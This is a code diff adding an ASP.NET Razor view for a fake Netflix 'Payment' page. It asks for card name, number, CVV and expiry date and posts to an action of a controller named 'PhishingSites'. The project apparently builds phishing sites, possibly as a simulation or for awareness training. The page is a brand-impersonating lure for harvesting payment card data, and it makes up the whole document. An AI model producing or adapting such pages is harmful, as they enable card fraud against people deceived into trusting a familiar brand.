@@ -1,0 +1,52 @@
+@{
+    Layout = null;
+}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Login Page | CodingNepal</title>
+    <link rel="stylesheet" href="~/css/netflix.css">
+</head>
+<body>
+<img src="~/images/TR-tr-20231211-popsignuptwoweeks-perspective_alpha_website_large.jpg" class="bg">
+<div id="page-wrap">
+</div>
+<nav>
+    <a href="#"><img src="~/images/logo.svg" alt="logo"></a>
+</nav>
+<div class="form-wrapper">
+    <h2>Payment</h2>
+    @using (Html.BeginForm("Error", "PhishingSites", FormMethod.Post))
+    {
+        <div class="form-control">
+            <input type="text" required>
+            <label>Card Name</label>
+        </div>
+        <div class="form-control">
+            <input type="text" oninput="formatCreditCardNumber()" id="creditCard" required>
+            <label>Card number</label>  
+        </div>
+        <div class="form-control">
+            <input type="text" oninput="CVV()" id="cvv" maxlength="3" required>
+            <label>CVV</label>
+        </div>
+        <div class="form-control">
+            <input type="text"  id="expirationDate"  oninput="formatDate()" maxlength="5" required>
+            <label>Card expiration date</label>
+        </div>
+        <button type="submit">Pay</button>
+        <div class="form-help">
+            <a href="#">Need help?</a>
+        </div>
+    }
+
+    <small>
+        This page is protected by Google reCAPTCHA to ensure you're not a bot.
+        <a href="#">Learn more.</a>
+    </small>
+</div>
+<script src="/js/card.js"></script>
+</body>
+</html>
